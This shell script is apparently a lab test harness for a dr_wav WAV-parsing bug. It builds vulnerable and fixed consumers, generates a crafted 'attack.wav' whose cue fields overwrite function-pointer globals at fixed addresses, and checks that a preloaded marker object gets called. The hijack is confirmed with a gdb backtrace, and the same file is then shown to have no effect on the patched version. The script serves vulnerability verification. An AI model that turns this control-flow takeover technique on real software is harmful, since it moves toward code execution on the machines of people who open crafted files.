#!/bin/sh
# drwav2shell W4: file-chosen control-flow divergence in the non-PIE consumer.
#
# The crafted WAV's cue fields take over three adjacent function-pointer
# globals in the unmodified upstream consumer at fixed addresses 0x41e118,
# 0x41e120 and 0x41e128. The chosen addresses name a lab-only marker object
# loaded with LD_PRELOAD at a fixed text segment. Under the vulnerable header,
# libsndfile_uninit() calls the chosen marker and it writes an observed file;
# the fixed header and a safe smpl loop count do not.
#
# BOUNDARY: this is rung-4 mechanics, not r5. The marker object is injected by
# the lab, no wire/request input, shell, command or live service is involved.
set -u
HERE=$(cd "$(dirname "$0")" && pwd -P)
LAB=$(cd "$HERE/.." && pwd -P)
EVID="$HERE/evidence"
BUILD="$HERE/build"
WORK="$BUILD/marker-work"
MARKDIR=/tmp/drwav-marker
mkdir -p "$EVID" "$WORK/tests/testvectors/wav/tests" "$MARKDIR"

npass=0
nfail=0
ok() { npass=$((npass + 1)); echo "PASS $1"; }
no() { nfail=$((nfail + 1)); echo "FAIL $1"; }
expect() { if grep -q -- "$2" "$1"; then ok "$3"; else no "$3"; fi; }
expect_not() { if grep -q -- "$2" "$1"; then no "$3"; else ok "$3"; fi; }

if (cd "$LAB" && sha256sum -c pins/pins.sha256 && sha256sum -c consumer/consumer.sha256) >"$EVID/marker-pins.out" 2>&1; then
    ok "pins and consumer hashes match committed pins"
else
    no "pins and consumer hashes match committed pins"
    exit 1
fi

if ! command -v gdb >/dev/null 2>&1; then
    no "gdb available"
    exit 1
fi

for side in vuln fixed; do
    SRC="$BUILD/marker-$side"
    mkdir -p "$SRC/tests/wav" "$SRC/tests/common"
    cp "$LAB/pins/$side/dr_wav.h" "$SRC/dr_wav.h" || exit 1
    cp "$HERE/upstream/wav/wav_decoding.c" "$HERE/upstream/wav/wav_common.c" "$SRC/tests/wav/" || exit 1
    cp "$HERE/upstream/common/dr_common.c" "$SRC/tests/common/" || exit 1
    if gcc -O0 -g -no-pie -o "$BUILD/marker-wav-$side" "$SRC/tests/wav/wav_decoding.c" -ldl -lm -lpthread; then
        ok "build non-PIE $side consumer (source unmodified)"
    else
        no "build non-PIE $side consumer (source unmodified)"
        exit 1
    fi
done

if gcc -shared -fPIC -Wl,-Ttext-segment=0x50000000 -o "$MARKDIR/marker.so" "$HERE/marker/marker.c" >"$EVID/marker-build.out" 2>&1; then
    ok "build fixed-address lab marker object"
else
    no "build fixed-address lab marker object"
    exit 1
fi
MARKER=0x$(nm -n "$MARKDIR/marker.so" | awk '$3 == "drwav_marker" { print $1 }')
NOOP=0x$(nm -n "$MARKDIR/marker.so" | awk '$3 == "drwav_noop" { print $1 }')
if [ -n "$MARKER" ] && [ -n "$NOOP" ]; then
    ok "marker and no-op entry points have fixed addresses ($MARKER, $NOOP)"
else
    no "marker and no-op entry points have fixed addresses"
    exit 1
fi

# Write target: 0x41e100 puts the first word at libsndfile__sf_close (0x41e118).
gen() {
    python3 "$HERE/make_marker_wav.py" "$WORK/tests/testvectors/wav/tests/attack.wav" 0x41e100 "$MARKER" "$NOOP" "$NOOP" "$1" >"$EVID/marker-gen.out" 2>&1 || exit 1
}

# Vulnerable header, chosen pointers: marker file must appear.
gen 1
rm -f "$MARKDIR/hit"
(cd "$WORK" && LD_PRELOAD="$MARKDIR/marker.so" "$BUILD/marker-wav-vuln" >"$EVID/marker-vuln.out" 2>&1; echo "rc=$?" >>"$EVID/marker-vuln.out")
expect "$EVID/marker-vuln.out" 'rc=0' "vulnerable consumer with chosen pointers completes"
if [ -f "$MARKDIR/hit" ]; then
    ok "chosen pointer caused an observed benign marker side effect"
    expect "$MARKDIR/hit" 'drwav-marker' "marker side effect carries the lab word"
else
    no "chosen pointer caused an observed benign marker side effect"
fi

# Prove the call site is the consumer's libsndfile_uninit, not the loader.
printf 'set pagination off\nset breakpoint pending on\nbreak drwav_marker\nrun\nbt 4\ncontinue\n' >"$WORK/marker.gdb"
(cd "$WORK" && LD_PRELOAD="$MARKDIR/marker.so" gdb -q -batch -x "$WORK/marker.gdb" --args "$BUILD/marker-wav-vuln") >"$EVID/marker-bt.out" 2>&1
expect "$EVID/marker-bt.out" 'libsndfile_uninit' "marker called from libsndfile_uninit"
expect "$EVID/marker-bt.out" 'wav_common.c:178' "call site is the function-pointer invocation"

# Fixed header: same crafted file, no chosen write, no marker.
rm -f "$MARKDIR/hit"
(cd "$WORK" && LD_PRELOAD="$MARKDIR/marker.so" "$BUILD/marker-wav-fixed" >"$EVID/marker-fixed.out" 2>&1; echo "rc=$?" >>"$EVID/marker-fixed.out")
expect "$EVID/marker-fixed.out" 'rc=0' "fixed 0.14.6 completes on the same file"
if [ -f "$MARKDIR/hit" ]; then
    no "fixed 0.14.6: no chosen marker call"
else
    ok "fixed 0.14.6: no chosen marker call"
fi

# Safe smpl loop count: same pointer fields, no write, no marker.
gen 0
rm -f "$MARKDIR/hit"
(cd "$WORK" && LD_PRELOAD="$MARKDIR/marker.so" "$BUILD/marker-wav-vuln" >"$EVID/marker-safe.out" 2>&1; echo "rc=$?" >>"$EVID/marker-safe.out")
expect "$EVID/marker-safe.out" 'rc=0' "safe smpl loop count completes"
if [ -f "$MARKDIR/hit" ]; then
    no "safe smpl loop count: no chosen marker call"
else
    ok "safe smpl loop count: no chosen marker call"
fi

echo "TOTAL PASS=$npass FAIL=$nfail"
[ "$nfail" -eq 0 ]
